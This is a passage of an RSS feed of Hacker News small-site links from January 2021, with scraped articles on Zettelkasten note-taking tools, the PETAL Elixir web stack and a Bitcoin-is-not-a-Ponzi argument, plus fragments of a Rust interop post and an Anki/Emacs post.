of just returning it, because it is not allowed to return a type that has a destructor.<br>
Instead of passing a trait object, our functions receive a pointer to the virtual table and
a ‚Ä¶</p></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sixtyfps.io/blog/expose-rust-library-to-other-languages.html">https://sixtyfps.io/blog/expose-rust-library-to-other-languages.html</a></em></p>]]>
            </description>
            <link>https://sixtyfps.io/blog/expose-rust-library-to-other-languages.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25802319</guid>
            <pubDate>Sat, 16 Jan 2021 14:26:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My Second Brain ‚Äì Zettelkasten]]>
            </title>
            <description>
<![CDATA[
Score 150 | Comments 94 (<a href="https://news.ycombinator.com/item?id=25802277">thread link</a>) | @spences10
<br/>
January 16, 2021 | https://scottspence.com/2020/07/17/my-second-brain-zettelkasten/ | <a href="https://web.archive.org/web/*/https://scottspence.com/2020/07/17/my-second-brain-zettelkasten/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><section></section><section><small><a href="https://scottspence.com/tags/habits">habits</a></small><small><a href="https://scottspence.com/tags/notes">notes</a></small><small><a href="https://scottspence.com/tags/vscode">vscode</a></small><small><a href="https://scottspence.com/tags/resource">resource</a></small><small><a href="https://scottspence.com/tags/tools">tools</a></small></section><p>For as long as I have been learning web development (<span>over 4 years</span>) I have been taking notes. Partly notes to help
clarify my understanding of something and partly for future me.</p><p>That‚Äôs why I have my <a href="https://scottspence.com/garden" target="_blank" rel="noopener">digital garden</a>, an online collection of my
learning over the years.</p><p>What is in my garden is not the full extent of the notes I have taken
however, there‚Äôs partly formed musings and one-liners that will help
me if I ever come across this one particular thing which took a while
to fix/resolve in the past.</p><p>Stuff like that doesn‚Äôt really warrant going into a post so I have
<a href="https://cheatsheets.xyz/" target="_blank" rel="noopener">Cheat Sheets</a> where that will get added to and grouped with the
relevant information.</p><p>It‚Äôs not been until recently that I have come to learn of the
<a href="https://zettelkasten.de/" target="_blank" rel="noopener">Zettelkasten</a> method, which translates from German to note box.</p><p>With tools like RoamResearch and Notion gaining popularity and me
using many of them I‚Äôve decided to make some notes on my opinions of
what I have been using over the years.</p><h2 id="cliffstldr"><a href="#cliffstldr" aria-label="cliffstldr permalink"></a>Cliffs/TL;DR</h2><p>I‚Äôm using a mixture of Foam and Obsidian with my data exported from
RoamResearch and Notion which I now use in a private GitHub repo that
I‚Äôm in full control of.</p><h2 id="github"><a href="#github" aria-label="github permalink"></a>GitHub</h2><p>GitHub is where it all began for me, with git being a particular
sticking point with a lot of commands that were all pretty alien at
the time so I started adding the commands <a href="https://gist.github.com/spences10/5c492e197e95158809a83650ff97fc3a" target="_blank" rel="noopener">to a gist</a> which has a
history going back to <a href="https://gist.github.com/spences10/5c492e197e95158809a83650ff97fc3a/revisions?page=2#diff-0517f094a4805e87e00d10b2891d99e4" target="_blank" rel="noopener">the start of 2017</a>.</p><p>As this list started to grow I also had other areas that I needed to
keep these little one-liners to hand, git being the largest but other
things like <a href="https://cheatsheets.xyz/mac/#screen-snip" target="_blank" rel="noopener">how to screen snip</a> on macOS and <a href="https://cheatsheets.xyz/bash/#kill-process-on-port" target="_blank" rel="noopener">kill a process</a> with
bash, all started adding up.</p><p>I moved them all into <a href="https://github.com/spences10/cheat-sheets" target="_blank" rel="noopener">one repository</a> for ease of access for me.
These later were added to <a href="https://cheatsheets.xyz/" target="_blank" rel="noopener">Cheat Sheets</a>.xyz</p><h2 id="notion"><a href="#notion" aria-label="notion permalink"></a>Notion</h2><p>Back when Notion was the new hotness and I jumped onto it as soon as a
discovered how flexable it was and more importantly cross platform, so
I could take notes on my phone, work laptop and personal computer yay
üéâ</p><p>I used it for stashing ideas for later, todo lists, shopping lists,
kanban boards and the 100s of links that I thought looked interesting
but didn‚Äôt have time to read it there and then so stashed them in the
Notion links database (never to be seen again ü§£).</p><p>Downsides, the search wasn‚Äôt great, that‚Äôs been improved in recent
iterations but was quite annoying when you wanted to find something
quickly.</p><p>The Android version just straight up stopped working, I couldn‚Äôt use
it and the general feeling from Notion was meh!</p><p>I learned the hard way about differing Markdown versions with this too
after making a 8k word post in Notion then copy pasting into VSCode to
find all the artifacts for code snippets and word formatting
throughout.</p><p>Getting my data out of Notion was straightforward enough but what I
was left with was a but of a mess. Because of the nesting you were
able to do with pages in pages the export was a mess of files with
hashes appended to them which is going to take a while to untangle.</p><h2 id="roamresearch"><a href="#roamresearch" aria-label="roamresearch permalink"></a>RoamResearch</h2><p>Roam RoamResearch was a different way of logging notes, the default
was to open you on a daily notes view where you‚Äôd add your notes and
you could then move these into more long form documents with the help
of the graph behind it which helped you link information with
backlinks (<code>[[example backlink]]</code>) with the intention of helping you
collate information from differing sources.</p><p>The odd bit was that you could only add in a bullet fashion, so if you
want to add a code block it always looked weird inline of a unordered
list.</p><p>It got a bit weird and culty, I always get a bit wary when companies
start referring to their users/employees as tribes, ‚ÄúRoamers‚Äù,
‚ÄúGooglers‚Äù, no thanks.</p><p>That along with starting it and staring at the rotating logo for an
age waiting for it to start, not helpful when you want to take a note
quickly.</p><p>Getting my data out of there was a straightforward button click
though.</p><h2 id="obsidian"><a href="#obsidian" aria-label="obsidian permalink"></a>Obsidian</h2><p>Obsidian, the free (or one off licence payment) offering that is a
standalone app, much like Notion (which I know is web based too)
available on macOS, Windows and Linux.</p><p>The idea is that the notes you take are hosted locally on your
machine, no central storage location like with Notion and
RoamResearch.</p><p>With Obsidian you are in direct control of the Markdown, store it
wherever you like.</p><p>This brings up questions about how and where you store your data, I‚Äôve
now added all the exports from Notion and RoamResearch to a git
repository which is on a private GitHub repo.</p><p>This is nice, there‚Äôs an import option for Roam exports, you can
configure your daily notes location and it has a super nice graph
view.</p><p>This experience felt a lot like working in VSCode, but it wasn‚Äôt
VSCode! üò¨</p><p>I‚Äôm very comfortable with editing Markdown in VSCode and felt a bit
cheated when I couldn‚Äôt select a tab or move lines around.</p><h2 id="foam"><a href="#foam" aria-label="foam permalink"></a>Foam</h2><p>So, Foam! <a href="https://github.com/foambubble/foam" target="_blank" rel="noopener">Foam is a VSCode extension</a> that enables the features of
Obsidian but with the editing power of VSCode, so no brainier, right?</p><p>Foam are the first to admit that <a href="https://foambubble.github.io/foam/#getting-started" target="_blank" rel="noopener">things may be a little rough</a> as
it‚Äôs still in preview. But I <em>really</em> like working with my Markdown in
VSCode so I‚Äôm prepared for the teething issues.</p><p>There‚Äôs a <a href="https://discord.gg/rtdZKgj" target="_blank" rel="noopener">super welcoming Discord</a> to join and talk to other users
and the developers.</p><p>With my new liberated data from Notion and RoamResearch I‚Äôm in the
process of working through all this data which is easy to visualise
with the VSCode file explorer and built in graph view of Foam.</p><p>The Foam graph view is still a WIP so I‚Äôm referring to Obsidian to
check that out for now.</p><p>I‚Äôm super excited following the progress of this!</p><a href="#top-of-page" aria-label="back to top navigation"><p>Back to Top</p></a></article><div><p>If you're interested in occasional updates from me about what I'm working on and want useful information you can sign up to my newsletter.</p><p>Important dev related content, directly to your inbox (for free).</p><p><span role="img" aria-label="sparkles">‚ú® ‚ú® ‚ú® ‚ú® ‚ú® ‚ú® ‚ú®</span>I'm giving away sticker packs every Monday, Wednesday and Friday to a randomly chosen newsletter subscriber. üëá</p><p><a href="https://scottspence.com/newsletter">Newsletter signup...</a></p></div></div>]]>
            </description>
            <link>https://scottspence.com/2020/07/17/my-second-brain-zettelkasten/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25802277</guid>
            <pubDate>Sat, 16 Jan 2021 14:19:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Petal Stack in Elixir]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25802233">thread link</a>) | @PKop
<br/>
January 16, 2021 | https://thinkingelixir.com/petal-stack-in-elixir/ | <a href="https://web.archive.org/web/*/https://thinkingelixir.com/petal-stack-in-elixir/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
		
<figure><img loading="lazy" width="1020" height="680" src="https://thinkingelixir.com/wp-content/uploads/2021/01/petal-stack-top-image_1020x680.png" alt="PETAL Stack parts" srcset="https://thinkingelixir.com/wp-content/uploads/2021/01/petal-stack-top-image_1020x680.png 1020w, https://thinkingelixir.com/wp-content/uploads/2021/01/petal-stack-top-image_1020x680-300x200.png 300w, https://thinkingelixir.com/wp-content/uploads/2021/01/petal-stack-top-image_1020x680-768x512.png 768w" sizes="(max-width: 1020px) 100vw, 1020px"></figure>



<p>The PETAL Stack in Elixir means:</p>



<ul><li><a href="https://www.phoenixframework.org/" target="_blank" rel="noreferrer noopener"><strong>P</strong>hoenix</a></li><li><a href="https://elixir-lang.org/" target="_blank" rel="noreferrer noopener"><strong>E</strong>lixir</a></li><li><a href="https://tailwindcss.com/" target="_blank" rel="noreferrer noopener"><strong>T</strong>ailwindCSS</a></li><li><a href="https://github.com/alpinejs/alpine/" target="_blank" rel="noreferrer noopener"><strong>A</strong>lpine.js</a></li><li><a href="https://hex.pm/packages/phoenix_live_view" target="_blank" rel="noreferrer noopener"><strong>L</strong>iveView</a></li></ul>



<p>While PETAL is also a pretty sounding name, this technology combination is  extremely powerful and productive for the right kinds of projects.</p>



<p>What kinds of projects? Web applications (or SaaS) with a responsive and reactive UI. This isn‚Äôt for building an API first service like Stripe or a mobile application you download in an App Store. This is specifically for building a web application with a responsive and reactive user experience that would otherwise require a SPA (Single Page Application) Javascript front end to enable the user experience you wanted.</p>



<p>If that sounds beneficial to you then read on! If you‚Äôre already sold on this approach, jump to the bottom for a collection of resources.</p>



<h2>It‚Äôs about the layers</h2>



<p>First, the base foundation of Elixir + Phoenix + LiveView is powerful. It has been the inspiration for other projects like <a href="https://laravel-livewire.com/" target="_blank" rel="noreferrer noopener">Laravel LiveWire</a> and <a href="https://hotwire.dev/" target="_blank" rel="noreferrer noopener">Rails Hotwire</a>.</p>



<p>What the Elixir + Phoenix + LiveView approach shares with LiveWire and Hotwire, is a removal of many layers that people assumed were required. In order to offer a smooth, responsive UI experience, we must build a Javascript frontend SPA (Single Page App), right? For awhile now, that has been true.</p>



<p>But what if I could build an interactive web application that felt immediate and was very responsive and reactive to the user <em>without</em> building a SPA? If I could do that, then I could eliminate the following layers:</p>



<ul><li>JSON serialization from server to client</li><li>GraphQL types, resolvers, queries and mutations</li><li>REST controllers</li><li>Javascript routers</li><li>Javascript data stores</li><li>JSON serialization from client to server</li></ul>



<p>I choose to go the LiveView route not because Javascript is ‚Äúbad‚Äù or because ‚ÄúI don‚Äôt want to use javascript‚Äù, but because I can completely <em>eliminate</em> all those layers! Front to back testing <em>also</em> becomes a much easier!</p>



<p>Removing those layers means maybe I don‚Äôt need a separate and dedicated front-end team to manage the complexities of our continually changing Javascript build pipeline. This means a smaller team can deliver compelling solutions faster than rival products built by much larger teams.</p>



<p>The removal of entire layers that require design, testing, maintenance and coordination between multiple people and teams brings a <em>huge boost to team productivity</em>!</p>



<h2>Still using javascript</h2>



<p>There are still elements of the UI that need javascript. A clear example is opening a popup menu. Clicking to open or close a menu should not require communication with the server!</p>



<p>This is where <a href="https://github.com/alpinejs/alpine/" target="_blank" rel="noreferrer noopener">Alpine.js</a> comes in. Alpine.js was created by Caleb Porzio, the creator of Laravel LiveWire. While creating LiveWire, he realized that some lightweight Javascript was still needed. He liked the Vue.js style so he created Alpine.js specifically to fill that role.</p>



<p>Alpine.js was created with this LiveView/LiveWire approach in mind. Because of that, it pairs really well with Phoenix LiveView.</p>







<p>Alpine.js is a very clean approach that adds just enough javascript to smooth the lines between what should stay client side and letting LiveView do what it does best.</p>



<h2>Making it pretty</h2>



<p>The last part of PETAL we haven‚Äôt covered is the <strong>T</strong> for <a href="https://tailwindcss.com/" target="_blank" rel="noreferrer noopener">TailwindCSS</a>. Tailwind is a new ‚Äúutility first‚Äù approach to CSS. Your first reaction when seeing it is probably going to be, ‚ÄúYuck! I don‚Äôt like this!‚Äù. That was my first thought too. You should give it a chance though.</p>



<p>How do I feel about it now? Now I don‚Äôt want to style my applications the ‚Äúold way‚Äù again!</p>



<p>There is a separate <a href="https://tailwindui.com/" target="_blank" rel="noreferrer noopener">TailwindUI</a> website that is commercial. You pay for access to pre-built or pre-designed components, sections, layouts, or even whole pages.</p>







<p>The benefits that I see from TailwindCSS and TailwindUI is what it enables individuals and small teams to do. I used to spend hours tweaking my UI CSS and succeeding in making it only marginally less crappy. The benefit I got from TailwindUI (the paid for designed components), is that I could rapidly build something that looked great. Trading my money for time is a good exchange in my book! However, that only describes the benefit of paying for designed components. How‚Äôs that different than buying something like Bootstrap designed components and pages?</p>



<p>That‚Äôs where the other, less tangible benefits of TailwindCSS come in. I‚Äôll try to explain some here:</p>



<ul><li>It doesn‚Äôt take long to get the hang of it. Then I became much more productive when designing <em>new</em> things myself.</li><li>The classes are very focused in what they do. I can ‚Äúcompose‚Äù what I want and don‚Äôt have to worry about changing a class style and having it mess up something elsewhere in my application.</li><li>Co-locating the CSS styles (by use of classes) feels more natural. I‚Äôm not switching files and jumping my focus around when working on the UI.</li><li>Co-locating the CSS styles directly in my markup means that when I delete a component I‚Äôm not using, I‚Äôm not left with orphaned CSS classes and files.</li><li>It makes it really easy to put different media query breakpoints on your layouts. Tailwind makes it easier to have responsive layouts that better support a variety of screen dimensions.</li></ul>



<h2>PETAL together now!</h2>



<p>With all the PETAL pieces introduced, I can explain the appeal of the fully combined stack. Using this development approach‚Ä¶</p>



<figure><blockquote><p>I can build a compelling, sleek, responsive web application by myself.</p></blockquote></figure>



<p>This is huge! </p>



<p>Going back to the early days of Rails with the ‚Äú15-minute blog‚Äù videos. It got people excited that a single developer could build a web application and deliver it by themselves! Then, over time, user expectations shifted to expect experiences that only a SPA could bring. That required ever more technology and layers to enable. Soon it required larger teams of specialized developers to create a competitive web application.</p>



<p>When I use the PETAL Stack, I have a competitive advantage. I can create a service that has an audience willing to pay money, but it‚Äôs never going to be the next Twitter, Facebook or Uber. A business could be successful but never to a scale where it supports a large team of developers and designers from the revenue. However, it starts to make business sense when only 1 or 2 people are needed to build and deliver it. Many business ideas can provide more than enough revenue for that!</p>



<p>It doesn‚Äôt have to be a smaller business idea though. This technology stack also enables a small team (like 4-5 developers) to create and maintain a service that only much larger teams and companies would otherwise take on. The more people you add to a team the more time is spent on administration, communication, and coordination. Being <em>able</em> to keep a team small becomes an additional competitive advantage!</p>



<div><div><div><p>In episode #24 of the Thinking Elixir Podcast, we talk with Chris McCord, the creator of Phoenix and LiveView about the PETAL stack. He shares his appreciation for the pairing with Alpine.js and TailwindCSS.</p><blockquote data-secret="yTk6gy6S5P"><a href="https://thinkingelixir.com/podcast-episodes/024-liveview-uploads-with-chris-mccord/">#024 LiveView Uploads with Chris McCord</a></blockquote></div></div></div>



<p>There is a lot to love when you build using the PETAL Stack. If it fits the kinds of problems you aim to solve, then it can be your competitive advantage and a powerful enabling force.</p>



<h2>Resources for learning PETAL</h2>



<p><strong>Tailwind</strong></p>



<ul><li><a href="https://tailwindcss.com/" target="_blank" rel="noreferrer noopener">https://tailwindcss.com/</a></li><li><a href="https://tailwindui.com/" target="_blank" rel="noreferrer noopener">https://tailwindui.com/</a>&nbsp;</li><li><a href="https://tailwindcss.com/course">https://tailwindcss.com/course</a> ‚Äì Official Tailwind screencast on designing with Tailwind CSS.</li><li><a href="https://pragmaticstudio.com/tutorials/adding-tailwind-css-to-phoenix" target="_blank" rel="noreferrer noopener">https://pragmaticstudio.com/tutorials/adding-tailwind-css-to-phoenix</a> ‚Äì Adding Tailwind to a Phoenix project.</li><li><a href="https://nerdcave.com/tailwind-cheat-sheet" target="_blank" rel="noreferrer noopener">https://nerdcave.com/tailwind-cheat-sheet</a> ‚Äì Searchable cheat sheet</li></ul>



<p><strong>Alpine</strong></p>



<ul><li><a href="https://github.com/alpinejs/alpine" target="_blank" rel="noreferrer noopener">https://github.com/alpinejs/alpine</a> ‚Äì Alpine GitHub and documentation</li><li><a href="https://dockyard.com/blog/2020/12/21/optimizing-user-experience-with-liveview" target="_blank" rel="noreferrer noopener">https://dockyard.com/blog/2020/12/21/optimizing-user-experience-with-liveview</a> ‚Äì Chris McCord blog post about using Alpine.js with LiveView</li><li><a href="https://css-tricks.com/alpine-js-the-javascript-framework-thats-used-like-jquery-written-like-vue-and-inspired-by-tailwindcss/">https://css-tricks.com/alpine-js-the-javascript-framework-thats-used-like-jquery-written-like-vue-and-inspired-by-tailwindcss/</a> ‚Äì A good introduction to Alpine</li></ul>



<h2>Coming Soon</h2>



<p>I hear you say, ‚ÄúSo I get it. As an individual or as a small team, I can be more productive by eliminating the need for those other tech stack layers. Why choose Elixir over Rails Hotwire or Laravel LiveWire?‚Äù</p>



<p>This is where Elixir pulls ahead and really differentiates itself!</p>



<p>A look at why the Elixir + Phoenix + LiveView part of the stack is a powerful solution.</p>
	</div></div>]]>
            </description>
            <link>https://thinkingelixir.com/petal-stack-in-elixir/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25802233</guid>
            <pubDate>Sat, 16 Jan 2021 14:11:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Bitcoin Is Not a Ponzi Scheme: Point by Point]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25802121">thread link</a>) | @jger15
<br/>
January 16, 2021 | https://www.swanbitcoin.com/why-bitcoin-is-not-a-ponzi-scheme-point-by-point/ | <a href="https://web.archive.org/web/*/https://www.swanbitcoin.com/why-bitcoin-is-not-a-ponzi-scheme-point-by-point/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p><em>Find more of Lyn‚Äôs work at <a href="https://lynalden.com/">lynalden.com</a></em></p>



<p>One of the concerns I‚Äôve seen aimed at Bitcoin is the claim that it‚Äôs a&nbsp;Ponzi scheme. The argument suggests that because the Bitcoin network is contin¬≠u¬≠ally reliant on new people buying in, that eventu¬≠ally it will collapse in price as new buyers are exhausted.</p>



<p>So, this article takes a&nbsp;serious look at the concern by comparing and contrasting Bitcoin to systems that have Ponzi-like charac¬≠ter¬≠is¬≠tics, to see if the claim holds up.</p>



<p>The short version is that Bitcoin does not meet the defin¬≠i¬≠tion of a&nbsp;Ponzi scheme in either narrow or broad scope, but let‚Äôs dive in to see why that‚Äôs the case.</p>







<h2><strong>Defining a&nbsp;Ponzi Scheme</strong></h2>



<p>To start with tackling the topic of Bitcoin as a&nbsp;Ponzi scheme, we need a&nbsp;defin¬≠i¬≠tion.</p>



<p>Here is how the <a href="https://www.investor.gov/protect-your-investments/fraud/types-fraud/ponzi-scheme">US Securi¬≠ties and Exchange Commis¬≠sion defines one</a>:</p>



<p><em>‚ÄúA Ponzi scheme is an invest¬≠ment fraud that pays existing investors with funds collected from new investors. Ponzi scheme organizers often promise to invest your money and generate high returns with little or no risk. But in many Ponzi schemes, the fraud¬≠sters do not invest the money. Instead, they use it to pay those who invested earlier and may keep some for themselves.</em></p>



<p><em>With little or no legit¬≠i¬≠mate earnings, Ponzi schemes require a&nbsp;constant flow of new money to survive. When it becomes hard to recruit new investors, or when large numbers of existing investors cash out, these schemes tend to collapse.</em></p>



<p><em>Ponzi schemes are named after Charles Ponzi, who duped investors in the 1920s with a&nbsp;postage stamp specu¬≠la¬≠tion scheme.‚Äù</em></p>



<p>They further go on to list red flags to look out for:</p>



<p><em>‚ÄúMany Ponzi schemes share common charac¬≠ter¬≠is¬≠tics. Look for these warning signs:</em></p>



<p><strong><em>High returns with little or no risk.</em></strong><em>&nbsp;Every invest¬≠ment carries some degree of risk, and invest¬≠ments yielding higher returns typically involve more risk. Be highly suspi¬≠cious of any ‚Äúguaran¬≠teed‚Äù invest¬≠ment oppor¬≠tu¬≠nity.</em></p>



<p><strong><em>Overly consis¬≠tent returns.</em></strong><em>&nbsp;Invest¬≠ments tend to go up and down over time. Be skeptical about an invest¬≠ment that regularly gener¬≠ates positive returns regard¬≠less of overall market condi¬≠tions.</em></p>



<p><strong><em>Unreg¬≠is¬≠tered invest¬≠ments.</em></strong><em>&nbsp;Ponzi schemes typically involve invest¬≠ments that are not regis¬≠tered with the SEC or with state regula¬≠tors. Regis¬≠tra¬≠tion is impor¬≠tant because it provides investors with access to infor¬≠ma¬≠tion about the company‚Äôs manage¬≠ment, products, services, and finances.</em></p>



<p><strong><em>Unlicensed sellers.</em></strong><em>&nbsp;Federal and state securi¬≠ties laws require invest¬≠ment profes¬≠sionals and firms to be licensed or regis¬≠tered. Most Ponzi schemes involve unlicensed individ¬≠uals or unreg¬≠is¬≠tered firms.</em></p>



<p><strong><em>Secre¬≠tive, complex strate¬≠gies.</em></strong><em>&nbsp;Avoid invest¬≠ments if you don‚Äôt under¬≠stand them or can‚Äôt get complete infor¬≠ma¬≠tion about them.</em></p>



<p><strong><em>Issues with paper¬≠work.</em></strong><em>&nbsp;Account state¬≠ment errors may be a&nbsp;sign that funds are not being invested as promised.</em></p>



<p><strong><em>Diffi¬≠culty receiving payments.</em></strong><em>&nbsp;Be suspi¬≠cious if you don‚Äôt receive a&nbsp;payment or have diffi¬≠culty cashing out. Ponzi scheme promoters sometimes try to prevent partic¬≠i¬≠pants from cashing out by offering even higher returns for staying put.‚Äù</em></p>



<p>I think that‚Äôs a&nbsp;great set of infor¬≠ma¬≠tion to work with. We can see how many of those attrib¬≠utes, if any, Bitcoin has.</p>



<h2><strong>Bitcoin‚Äôs Launch Process</strong></h2>



<p>Before we get into comparing Bitcoin point-by-point to the above list, we can start with a&nbsp;recap of how Bitcoin was launched.</p>



<p>In August 2008, someone identi¬≠fying himself as Satoshi Nakamoto created Bitcoin.org.</p>



<p>Two months later in October 2008, Satoshi released the <a href="https://bitcoin.org/bitcoin.pdf">Bitcoin white paper</a>. This document explained how the technology would work, including the solution to the double-spending problem. As you can see from the link, it was written in the format and style of an academic research paper, since it was presenting a&nbsp;major technical break¬≠through that provided a&nbsp;solution for well-known computer science challenges related to digital scarcity. It contained no promises of enrich¬≠ment or returns.</p>



<p>Then, three months later in January 2009, Satoshi published the initial Bitcoin software. In the custom genesis block of the blockchain, which contains no spend¬≠able Bitcoin, he provided a&nbsp;time-stamped article headline about bank bailouts from The Times of London, likely to prove that there was no pre-mining and to set the tone for the project. From there, it took him six days to finish things and mine block 1, which contained the first 50 spend¬≠able bitcoins, and he released the Bitcoin source code that day on January 9<sup>th</sup>. By January 10<sup>th</sup>, Hal Finney publicly tweeted that he was running the Bitcoin software as well, and right from the begin¬≠ning, Satoshi was testing the system by sending bitcoins to Hal.</p>



<p>Inter¬≠est¬≠ingly, since Satoshi showed how to do it with the white paper more than two months before launching the open source Bitcoin software himself, techni¬≠cally someone could have used the newfound knowl¬≠edge to launch a&nbsp;version before him. It would have been unlikely, due to Satoshi‚Äôs big head start in figuring all of this out and under¬≠standing it at a&nbsp;deep level, but it was techni¬≠cally possible. He gave away the key techno¬≠log¬≠ical break¬≠through before he launched the first version of the project. Between the publi¬≠ca¬≠tion of the white paper and the launch of the software, he answered questions and explained his choices for his white paper to several other cryptog¬≠ra¬≠phers on an <a href="https://satoshi.nakamotoinstitute.org/emails/">email list</a> in response to their critiques, almost like an academic thesis defense, and several of them could have been technical enough to ‚Äústeal‚Äù the project from him, if they were less skeptical.</p>



<p>After launch, a&nbsp;set of equip¬≠ment that is widely believed to belong to Satoshi remained a&nbsp;large Bitcoin miner throughout the first year. Mining is neces¬≠sary to keep verifying trans¬≠ac¬≠tions for the network, and bitcoins had no quoted dollar price at that time. He gradu¬≠ally reduced his mining over time, as mining became more distrib¬≠uted across the network. There are nearly 1&nbsp;million bitcoins that are believed to belong to Satoshi that he mined through Bitcoin‚Äôs early period and that he has never moved from their initial address. He could have cashed out at any point with billions of dollars in profit, but so far has not, over a&nbsp;decade into the project‚Äôs life. It‚Äôs not known if he is still alive, but other than some early coins for test trans¬≠ac¬≠tions, the bulk of his coins haven‚Äôt moved.</p>



<p>Not long after, he trans¬≠ferred owner¬≠ship of his website domains to others, and ever since, Bitcoin has been self-sustaining among a&nbsp;revolving devel¬≠op¬≠ment commu¬≠nity with no input from Satoshi.</p>



<p>Bitcoin is open source, and is distrib¬≠uted around the world. The blockchain is public, trans¬≠parent, verifi¬≠able, auditable, and analyz¬≠able. Firms can do analytics of the entire blockchain and see which bitcoins are moving or remaining in place in various addresses. An open source full node can be run on a&nbsp;basic home computer, and can audit Bitcoin‚Äôs entire money supply and other metrics.</p>



<p>With that in mind, we can then compare Bitcoin to the red flags of being a&nbsp;Ponzi scheme.</p>



<h2><strong>Investment Returns: Not Promised</strong></h2>



<p>Satoshi never promised any invest¬≠ment returns, let alone high invest¬≠ment returns or consis¬≠tent invest¬≠ment returns. In fact, Bitcoin was known for the first decade of its existence as being an extremely high-volatility specu¬≠la¬≠tion. For the first year and a&nbsp;half, Bitcoin had no quotable price, and after that it had a&nbsp;very volatile price.</p>



<p>The online writings from Satoshi still exist, and he barely ever talked about finan¬≠cial gain. He mostly wrote about technical aspects, about freedom, about the problems of the modern banking system, and so forth. Satoshi wrote mostly like a&nbsp;programmer, occasion¬≠ally like an econo¬≠mist, and never like a&nbsp;salesman.</p>



<p>We have to search pretty deeply to find instances where he discussed Bitcoin poten¬≠tially becoming valuable. When he did talk about the poten¬≠tial value or price of a&nbsp;bitcoin, he spoke very matter-of-factly in regards to how to catego¬≠rize it, whether it would be infla¬≠tionary or defla¬≠tionary, and admitted a&nbsp;ton of variance for how the project could turn out. Digging around for Satoshi‚Äôs quotes on the price of value of a&nbsp;bitcoin, here‚Äôs what I&nbsp;found:</p>



<p><em>‚ÄúThe fact that new coins are produced means the money supply increases by a&nbsp;planned amount, but this does not neces¬≠sarily result in infla¬≠tion. If the supply of money increases at the same rate that the number of people using it increases, prices remain stable. If it does not increase as fast as demand, there will be defla¬≠tion and early holders of money will see its value increase.‚Äù</em></p>



<p><em>___</em></p>



<p><em>‚ÄúIt might make sense just to get some in case it catches on. If enough people think the same way, that becomes a&nbsp;self fulfilling prophecy. Once it gets bootstrapped, there are so many appli¬≠ca¬≠tions if you could effort¬≠lessly pay a&nbsp;few cents to a&nbsp;website as easily as dropping coins in a&nbsp;vending machine.‚Äù</em></p>



<p><em>___</em></p>



<p><em>‚ÄúIn this sense, it‚Äôs more typical of a&nbsp;precious metal. Instead of the supply changing to keep the value the same, the supply is prede¬≠ter¬≠mined and the value changes. As the number of users grows, the value per coin increases. It has the poten¬≠tial for a&nbsp;positive feedback loop; as users increase, the value goes up, which could attract more users to take advan¬≠tage of the increasing value.‚Äù</em></p>



<p><em>___</em></p>



<p><em>‚ÄúMaybe it could get an initial value circu¬≠larly as you‚Äôve suggested, by people foreseeing its poten¬≠tial useful¬≠ness for exchange. (I would definitely want some) Maybe collec¬≠tors, any random reason could spark it. I&nbsp;think the tradi¬≠tional quali¬≠fi¬≠ca¬≠tions for money were written with the assump¬≠tion that there are so many competing objects in the world that are scarce, an object with the automatic bootstrap of intrinsic value will surely win out over those without intrinsic value. But if there were nothing in the world with intrinsic value that could be used as money, only scarce but no ‚Ä¶</em></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.swanbitcoin.com/why-bitcoin-is-not-a-ponzi-scheme-point-by-point/">https://www.swanbitcoin.com/why-bitcoin-is-not-a-ponzi-scheme-point-by-point/</a></em></p>]]>
            </description>
            <link>https://www.swanbitcoin.com/why-bitcoin-is-not-a-ponzi-scheme-point-by-point/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25802121</guid>
            <pubDate>Sat, 16 Jan 2021 13:45:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Power up Anki with Emacs, Org mode, Anki-editor and more]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25802026">thread link</a>) | @birriel
<br/>
January 16, 2021 | https://yiufung.net/post/anki-org/ | <a href="https://web.archive.org/web/*/https://yiufung.net/post/anki-org/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>It‚Äôs been a while since the last post, one reason is that for the past few
months I‚Äôve been drawn to <a href="https://apps.ankiweb.net/">Anki</a>, the spaced-repetition flashcard program. If you
haven‚Äôt checked it out yet, I strongly recommended it. (<a href="http://augmentingcognition.com/ltm.html">Why? Read Michael
Nielson‚Äôs article</a>)</p>
<p>One question recurred among Anki community is how to generate cards quickly. 3
approaches are common:</p>
<ol>
<li>Use Anki‚Äôs ‚ÄúImport‚Äù function to read csv/tsv</li>
<li>Write Python scripts with <a href="https://github.com/kerrickstaley/genanki">genanki</a> that generate <code>.apkg</code> for import</li>
<li>Use third-party browser plugin that supports <a href="https://ankiweb.net/shared/info/2055492159">AnkiConnect</a> (e.g. <a href="https://foosoft.net/projects/yomichan/">yomichan</a>)</li>
</ol>
<p>While these are viable and oftentimes powerful options, for users they usually
don‚Äôt come as flexible for customization (change matching of columns &amp; fields,
ad-hoc editing, formula/highlight/table/etc support). Programming experience is
yet another entry barrier for many people.</p>
<p>In this post I‚Äôll try to demonstrate some workflows of creating cards in Emacs
based on <a href="https://github.com/louietan/anki-editor">anki-editor</a>, a package that connects Emacs‚Äôs Org-mode and AnkiConnect.
Combining <code>anki-editor</code>'s connectivity, Emacs‚Äôs customizability, and Org-mode‚Äôs
rich formatting and export support, a few card generation scenarios can be
handled with ease:</p>
<ul>
<li>Utilize a powerful editor for card editing</li>
<li>Capture ideas with least interruption as you encounter interesting content</li>
<li>Customize shortcut keys and workflow, minimize mouse pointing/clicking</li>
<li>etc‚Ä¶</li>
</ul>
<p><span><strong>Note for Anki users who hear of Org-mode for the first time</strong></span>: Take a look at
